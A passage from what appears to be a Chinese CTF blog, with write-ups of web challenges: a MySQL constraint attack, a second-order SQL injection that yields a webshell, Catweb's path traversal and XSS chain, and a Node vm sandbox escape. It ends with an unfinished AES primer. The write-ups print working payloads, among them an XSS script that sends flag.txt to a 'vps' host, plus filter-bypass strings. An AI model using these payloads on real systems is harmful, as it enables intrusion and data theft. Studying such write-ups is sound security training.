<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_post</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $_POST;</span><br><span class="line"></span><br><span class="line">  $name = $_POST[<span class="string">"name"</span>];</span><br><span class="line">  $secret = $_POST[<span class="string">"secret"</span>];</span><br><span class="line">  $description = $_POST[<span class="string">"description"</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($name) &amp;&amp; $name !== <span class="string">""</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>($secret) &amp;&amp; $secret !== <span class="string">""</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>($description) &amp;&amp; $description !== <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (validate_secret($secret) === <span class="keyword">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"Invalid secret, please check requirements"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$product = get_product($name);</span><br><span class="line"><span class="keyword">if</span> ($product !== <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"Product name already exists, please enter again"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insert_product($name, hash(<span class="string">'sha256'</span>, $secret), $description);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Product has been added&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只对secret进行了一些检测，其他的倒是没管</p>
<p>跟进insert_product看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_product</span><span class="params">($name, $secret, $description)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"INSERT INTO products (name, secret, description) VALUES</span></span><br><span class="line"><span class="string">      (?, ?, ?)"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"sss"</span>, $name, $secret, $description);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是赤裸裸的预处理插入，再看一下后面的view</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样是赤裸裸的查看，这里就很满足Mysql约束攻击的条件了，下面详细说一下这个攻击的具体流程</p>
<p>原理是利用Mysql中select的时候</p>
<p><img src="https://s2.ax1x.com/2019/09/04/nZYY3q.png" alt="nZYY3q.png"></p>
<p>这里可以看出加完空格其实和没加空格是一样的，那么我们可以先注册一个facebook+50*空格+1,这里可以防止先进行select查询出相同的用户名(这里没有，然后insert插入是有长度限制的，所以插入的其实就是facebook+空格，放入Mysql中，最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;SELECT name, description FROM products WHERE name &#x3D; ?&quot;</span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<p>这里其实当时还有个疑问，为什么我当时插入的数据没拿到呢，后来看了一下fetch_assoc</p>
<p>这个函数，发现了问题，手册解释如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch_assoc(), 以一个关联数组方式抓取一行结果</span><br></pre></td></tr></table></figure>

<p>这样就很清楚了。</p>
<p>最后总结一下mysql约束攻击在实战与CTF中的利用</p>
<p>其实mysql约束攻击最多用的地方就是在登陆处，伪造admin的身份去看看后台</p>
<p>像这道题为了出题而这么用mysql约束攻击我觉得似乎没有什么意义..，如下这段代码我就比较吐槽..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$statement = $db-&gt;prepare(</span><br><span class="line">   <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

<p>这么搞意思不就是去配合二次注入吗…</p>
<p>这里稍微思考了一个问题</p>
<p>常用的约束攻击实现登陆，是如果满足admin这个身份，就跳到属于admin的后台页面，但是如果我给<code>admin realpasswd</code>这个对应的那条数据加上一个独一无二的数据呢，那我们还能轻易拿到他的数据吗，很明显是不会的，这和Mysql的默认排序是有很大关系的，这道题应该是这么设计出取第一条数据正好对应的flag的描述，<strong>所以用约束攻击去绕过admin身份登陆才是最合理的一个过程，另外在看到插入和select出数据的这两个过程，应该很敏感的去反应到约束攻击</strong>。</p>
<h3 id="Filemanager"><a href="#Filemanager" class="headerlink" title="Filemanager"></a>Filemanager</h3><p>看注释似乎是ph牛出的一道题，蛮有意思，与其说他是一道二次注入，不如说这是一个逻辑思维漏洞，接下来就是一些思考过程</p>
<p>在rename.php中有很明显的二次注入点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line"></span><br><span class="line">	$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">	$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">		print_r($db-&gt;error);                       <span class="comment">//filename=../delete',extension='.php</span></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">	$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">	<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">		rename($oldname, $newname);</span><br><span class="line">	&#125;</span><br><span class="line">	$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单独放出来看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>)</span><br></pre></td></tr></table></figure>

<p>闭合一下oldname就可以为所欲为了，能注入了接下来能干嘛呢，首先看看数据库里有没有flag，大概看了一下xdctf.sql，感觉没什么希望，那既然能上传文件，可能就和拿shell有关吧，盯着这条语句仔细思考了一下，首先想到的自然是堆叠注入，但是试了一下，似乎没成功。</p>
<p>接着思考了一下， 这个闭合代表着我可以控制很多字段了，filename,extension字段等我都能控制，那么我通过改后缀去拿shell应该不难，首先我试的是直接把后缀改成php，后来发现不太行</p>
<p>因为在rename前面是有一个file_exists的判断的，目前是不存在x.php的，所以直接改成php肯定不行，在file_exists判断的时候一定要拿到一个存在的文件，那么我们把后缀设置为空，自己写文件名不就行了吗</p>
<p>具体过程：</p>
<p>上传一个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,filename&#x3D;&#39;lihuaiqiu.png&#39;,extension&#x3D;&#39;.png</span><br></pre></td></tr></table></figure>

<p>里面写好shell，接着通过rename：lihuaiqiu</p>
<p>然后再rename,填写内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">old: lihuaiqiu.png</span><br><span class="line"></span><br><span class="line">new: lihuaiqiu.php</span><br></pre></td></tr></table></figure>

<p>成功拿到shell。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Confidence CTF 2020-Web</title>
    <url>/2020/03/18/Confidence-CTF-2020-Web/</url>
    <content><![CDATA[<h4 id="Catweb"><a href="#Catweb" class="headerlink" title="Catweb"></a>Catweb</h4><p>先看一下题目的js代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewCats</span>(<span class="params">kind</span>) </span>&#123;</span><br><span class="line">			$.getJSON(<span class="string">'http://catweb.zajebistyc.tf/cats?kind='</span>+kind, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(data.status != <span class="string">'ok'</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$(<span class="string">'#cats_container'</span>).empty();</span><br><span class="line">				cats = data.content;</span><br><span class="line">				cats.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>) </span>&#123;</span><br><span class="line">					<span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">					newDiv.innerHTML = <span class="string">'&lt;img style="max-width: 200px; max-height: 200px" src="static/'</span>+kind+<span class="string">'/'</span>+cat+<span class="string">'" /&gt;'</span>;</span><br><span class="line">					$(<span class="string">'#cats_container'</span>).append(newDiv);</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			$(<span class="string">'#cat_select'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">				<span class="keyword">var</span> kind = $(<span class="keyword">this</span>).val();</span><br><span class="line">				history.pushState(&#123;&#125;, <span class="string">''</span>, <span class="string">'?'</span>+kind)</span><br><span class="line">				getNewCats(kind);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(kind == <span class="string">""</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				kind = <span class="string">'black'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			getNewCats(kind);</span><br><span class="line">		&#125;);</span><br></pre></td></tr></table></figure>

<p>在getNewCats函数中通过返回的json数据渲染div标签中的img图像，默认为黑色🐱，通过切换不同的颜色来渲染出不同🐱🐱的颜色。</p>
<p>很容易发现有目录穿越这个漏洞，并且可以通过目录穿越发现flag位于/templates/flag.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D;..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回结果：</span><br><span class="line">&#123;</span><br><span class="line">status: &quot;ok&quot;,</span><br><span class="line">content: [</span><br><span class="line">&quot;prestart.sh&quot;,</span><br><span class="line">&quot;uwsgi.ini&quot;,</span><br><span class="line">&quot;main.py&quot;,</span><br><span class="line">&quot;templates&quot;,</span><br><span class="line">&quot;static&quot;,</span><br><span class="line">&quot;app.py&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有另一个report通过，可以把url发给后台的bot 并且bot会不加任何验证的进行点击操作</p>
<p>比如我们发一个</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript:location=<span class="string">"http://139.224.236.99:8787"</span></span><br></pre></td></tr></table></figure>

<p>即可在自己的vps上监听到bot的请求</p>
<p>浏览完整个功能点后 回到第一个功能点可以发现可以进行json注入</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8wF8UA.png" alt="8wF8UA.png"></p>
<p>那么就意味着我们直接控制回显字段了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">img style&#x3D;&quot;max-width: 200px; max-height: 200px&quot; src&#x3D;&quot;static&#x2F;&#39;+kind+&#39;&#x2F;&#39;+cat+&#39;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>xss poc 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&#x2F;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;poc&quot;:&quot;</span><br></pre></td></tr></table></figure>

<p>其实这里我也比较好奇后台是怎么去检测这个路径的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..可以正常返回 而..&#x2F;xx&#x2F;..却不行</span><br><span class="line">但是..的逻辑实际上是等于..&#x2F;xx&#x2F;..的</span><br><span class="line">如果xx的形式可以的话 我们就用了另一种攻击方式 可以在kind处进行xss闭合</span><br><span class="line">emm 对这点同样有思考的师傅欢迎来一起讨论</span><br></pre></td></tr></table></figure>

<p>现在我们要做的是结合这个xss页面以及bot的点击将templates/flag.txt的内容带出</p>
<p>这里就用 <strong>CVE-2019-11730</strong> 这个漏洞</p>
<p><a href="https://github.com/alidnf/CVE-2019-11730" target="_blank" rel="noopener">POC及攻击视频</a></p>
<p>大概浏览下poc.html 可以得知这个CVE的攻击思路为通过当前location的file协议读取当前目录下的文件</p>
<p>部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (location.protocol != <span class="string">"file:"</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"- Error: File isn't loaded locally!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Use Clickjacking to trick the victim to click name of current file name in the hidden iframe.</span></span><br><span class="line">    <span class="comment">// First, Create a hidden iframe pointing to the parent directory.</span></span><br><span class="line">    <span class="keyword">var</span> exploit_iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    exploit_iframe.src = <span class="string">"./"</span>;</span><br><span class="line">    exploit_iframe.className = <span class="string">"exploit_iframe"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(exploit_iframe);</span><br><span class="line">    <span class="comment">// Second, Create a fake button and trick the user to click it.</span></span><br><span class="line">    <span class="keyword">var</span> fake_button = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">    fake_button.className = <span class="string">"fake_button"</span>;</span><br><span class="line">    fake_button.innerText = <span class="string">"Click Me! I have a gift for you!"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.append(fake_button);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过exploit iframe以及button click完成二次触发load和Bypass SOP</p>
<p>那么攻击思路就很明显了</p>
<ul>
<li>由于都是静态页面 file:///app/templates/index.html等价于catweb.zajebistyc.tf。</li>
<li>发送给后台bot file:///协议的payload 并且加上我们自己的js</li>
<li>后台点击触发</li>
</ul>
<p>Payload如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file:///app/templates/index.html?", "status": "ok", "content":["a\"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;location.href=<span class="string">'http://vps?q='</span>+<span class="built_in">encodeURIComponent</span>(btoa(xhr.responseText))&#125;; xhr.open(<span class="string">'GET'</span>, <span class="string">'flag.txt'</span>, <span class="literal">false</span>); xhr.send();  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"], "poc": "</span><br></pre></td></tr></table></figure>

<h3 id="temple-js"><a href="#temple-js" class="headerlink" title="temple-js"></a>temple-js</h3><p>通过这道题确实学到了很多</p>
<p>题目源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>)</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>)</span><br><span class="line"><span class="keyword">const</span> watchdog = <span class="built_in">require</span>(<span class="string">"./watchdog"</span>);</span><br><span class="line"></span><br><span class="line">global.flag = fs.readFileSync(<span class="string">"flag"</span>).toString()</span><br><span class="line"><span class="keyword">const</span> source = fs.readFileSync(__filename).toString()</span><br><span class="line"><span class="keyword">const</span> help = <span class="string">"There is no help on the way."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'public'</span>))</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/repl'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> sandbox = vm.createContext(&#123;<span class="attr">par</span>: (<span class="function"><span class="params">v</span> =&gt;</span> <span class="string">`(<span class="subst">$&#123;v&#125;</span>)`</span>), source, help&#125;)</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/^[a-zA-Z0-9 $&#123;&#125;`]+$/g</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> command = req.body[<span class="string">'cmd'</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&gt; <span class="subst">$&#123;command&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(validInput.test(command))</span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="keyword">let</span> watch = watchdog.schedule()</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response = vm.runInContext(command, sandbox, &#123;</span><br><span class="line">                    timeout: <span class="number">300</span>,</span><br><span class="line">                    displayErrors: <span class="literal">false</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                watchdog.stop(watch)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid input."</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ex)</span><br><span class="line">    &#123;</span><br><span class="line">        response = ex.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.ip&#125;</span>&lt; <span class="subst">$&#123;response&#125;</span>`</span>)</span><br><span class="line">    res.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"response"</span>: response&#125;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Listening on :<span class="subst">$&#123;port&#125;</span>...`</span>)</span><br><span class="line">app.listen(port, <span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>代码量比较少，大意是逃逸掉沙箱拿到沙箱外定义的flag</p>
<p>对于沙箱逃逸：</p>
<p>我们可以通过constructor.constructor返回的Function来返回我们的flag</p>
<p>通过constructor.constructor拿到的Function为沙箱外的Function</p>
<p>首先来看一个例子</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8013RO.png" alt="8013RO.png"></p>
<p>我们可以直接通过Function来定义一个任意内容的函数，第三种函数的定义用到了标签模板字符串</p>
<p>下图为给的例子</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8BRleH.png" alt="8BRleH.png"></p>
<p>对应我们例子中的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ƒ anonymous(a,</span><br><span class="line">) &#123;</span><br><span class="line"><span class="number">49</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>template String作为最后一个参数传入函数体内 成为我们自定义的函数内容，而a则作为此函数的参数。</p>
<p>那么接下来就可以写一个返回沙箱外函数的anoymous了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">'return constructor.constructor'</span>&#125;</span>`</span><span class="string">``</span><span class="string">``</span> </span><br><span class="line"><span class="comment">// or ``</span></span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>不过我们输入的字符被正则限制了，不能有.这个字符，不过可以直接用</p>
<p>with条件进行代替，并且不允许有()，那我们可以用sandbox中的par函数来返回(constructor)来bypass这个正则，最终payload为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="string">`with<span class="subst">$&#123;par<span class="string">`construtor`</span>&#125;</span>return constructor`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>再进行此anoymos函数的调用就可以获得Function了，然后再通过这个Function来返回沙箱外的flag.最后上个图：</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8B5OwF.png" alt="8B5OwF.png"></p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>用Function配和template String进行xss同样是很棒的攻击手法：</p>
<p>比如下面的Payload(tw上看到的)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`a<span class="subst">$&#123;<span class="built_in">unescape</span>. call<span class="string">`<span class="subst">$&#123;location&#125;</span>`</span>&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">结合在url中输入%0aalert()&#x2F;&#x2F;即可实现xss</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">&#x2F;&#x2F;拆分字母Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;return &#96;+&#96;aler&#96;+&#96;t(1)&#96;&#125;&#96;</span><br><span class="line">&#x2F;&#x2F;字符编码Bypass</span><br><span class="line">Function&#96;a$&#123;&#96;\x61\x6c\x65\x72\x74\x28\x29&#96;&#125;</span><br></pre></td></tr></table></figure>


<pre><code></code></pre>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto学习</title>
    <url>/2019/06/01/Crypto%D1%A7%CF%B0/</url>
    <content><![CDATA[<h3 id="AES加密原理剖析"><a href="#AES加密原理剖析" class="headerlink" title="AES加密原理剖析"></a>AES加密原理剖析</h3><p><strong>浅谈AES</strong></p>
<p>AES加密属于对称加密算法，与RSA不同的是，这类算法对明文的加密与解密都使用的是同一个密钥。</p>
<p>AES三种长度的密钥(不同的密钥长度有着不同的加密轮数)：</p>
<p>AES128: 10轮</p>
<p>AES192: 12轮</p>
<p>AES256: 14轮</p>
<p>从安全性来讲:AES128性能最高,AES256安全性最高。</p>
<p><strong>AES分组加密特性</strong></p>
<p><img src="https://img-blog.csdn.net/20180412234343842?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>AES在加密时，会将明文分成多个明文块，每块为16字节，128bit。明文经过AES加密器的处理生成密文块，将密文块拼接在一起，就是最后加密的结果。</p>
<p><strong>Padding</strong></p>
<p>在上面的假设中，我们的假设都是明文长度为16字节的整数倍，当明文长度不为16字节的整数倍时，此时就需要进行padding填充。下面介绍几种填充模式</p>
<ul>
<li>NoPadding:不做任何填充，要求明文字节长度必须是16的整数倍。</li>
<li>PKCS5adding(默认填充方式):如果明文块少于16个字节，则在明文块末尾补足相应数量的字符，并且每个字节的值等于缺少的字符数。如明文{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6}。</li>
<li>IS010126Padding:如果明文块少于十六个字节，在明文块末尾补足相应数量的字节，最后一个字符为缺少的字符数，其他字符都为随机字符。如：比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</li>
</ul>
<p><strong>注意点：AES加密与解密必须使用相同的填充方式。</strong></p>
<p><strong>模式</strong></p>
<p><strong>AES的工作模式，在于把明文块加密成密文块的处理过程</strong>，AES加密的五种模式：</p>
<p><code>ECB CBC CTR CFB OFB</code> 。</p>
<p>ECB(默认): 电码本模式</p>
<p>CBC:密码分组链接模式</p>
<p>CTR:计算机模式</p>
<p>CFB: 密码反馈模式</p>
<p>OFB：输出反馈模式</p>
<p><strong>AES加密与解密必须使用同一种模式</strong>（加密时使用ECB模式，解密必须也为ECB)</p>
<p><strong>AES算法底层原理解析</strong></p>
<p><img src="https://img-blog.csdn.net/20180412234649347?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>流程:</p>
<ul>
<li>输入一段明文，按每十六个字节分为一组进行分组，不足十六个字节的组进行padding。</li>
<li>每一块明文利用AES加密器和密钥进行加密。</li>
<li>拼接密文输出。</li>
</ul>
<p><strong>明文加密过程</strong>(扩展密钥)</p>
<p><img src="https://img-blog.csdn.net/20180412234742503?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>从上图我们可以看到，明文经过多轮加密最后生成密文。</p>
<p>轮数：</p>
<ul>
<li>初始轮 1次</li>
<li>普通轮 N次(和密钥长度有关)</li>
<li>最终轮 1次</li>
</ul>
<p>密钥的长度决定了加密的轮数。</p>
<p>初始轮步骤：加轮密钥</p>
<p>普通轮步骤：字节代替，行移位，列混淆，加轮密钥</p>
<p>最终轮步骤：字节代替，行移位，加轮密钥</p>
<p><strong>步骤详解</strong></p>
<p>1.字节替代</p>
<p><img src="https://img-blog.csdn.net/20180412234847338?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>在加密过程中，16字节的明文在每一个处理步骤中都会被排列为4*4的二位数组，在替代步骤中根据S盒(一个16 * 16的二维常量数组)，如明文块中a[2,2]=5B,那么在输出中b[2,2]=S[5][11]。下面是S盒</p>
<p><img src="https://img-blog.csdn.net/20160113155714985" alt="è¿éåå¾çæè¿°"></p>
<p>2.行移位</p>
<p><img src="https://img-blog.csdn.net/20180412234903455?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>这个步骤很简单的，第一个不变，第二行循环向左移动一个字节，第三行两个，以此类推。</p>
<p>3.列混淆</p>
<p><img src="https://img-blog.csdn.net/20180412234917268?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s0msagsuj30gn04s74j.jpg" alt="img"></p>
<p>计算方式为</p>
